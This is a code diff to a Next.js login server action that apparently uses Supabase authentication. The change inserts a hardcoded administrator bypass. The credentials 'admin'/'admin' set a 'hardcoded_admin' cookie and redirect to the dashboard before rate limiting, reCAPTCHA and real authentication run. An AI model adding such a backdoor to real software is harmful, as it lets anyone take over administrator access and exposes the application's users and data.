@@ -4,7 +4,7 @@ import { revalidatePath } from 'next/cache'
 import { redirect } from 'next/navigation'
 import { createClient } from '@/lib/supabase/server'
 import rateLimit from '@/lib/rate-limit'
-import { headers } from 'next/headers'
+import { headers, cookies } from 'next/headers'
 
 const limiter = rateLimit({
   uniqueTokenPerInterval: 500,
@@ -40,14 +40,23 @@ async function checkRateLimit() {
 }
 
 export async function login(formData: FormData) {
+  const email = formData.get('email') as string
+  const password = formData.get('password') as string
+
+  // HARDCODED ADMIN BYPASS
+  if (email === 'admin' && password === 'admin') {
+    const cookieStore = await cookies();
+    cookieStore.set('hardcoded_admin', 'true', { path: '/' });
+    revalidatePath('/', 'layout');
+    redirect('/dashboard');
+  }
+
   const supabase = await createClient()
 
   if (!(await checkRateLimit())) {
     return { error: "Too many attempts. Please try again in a minute." }
   }
 
-  const email = formData.get('email') as string
-  const password = formData.get('password') as string
   const recaptchaToken = formData.get('recaptchaToken') as string
 
   if (recaptchaToken && !(await verifyRecaptcha(recaptchaToken))) {
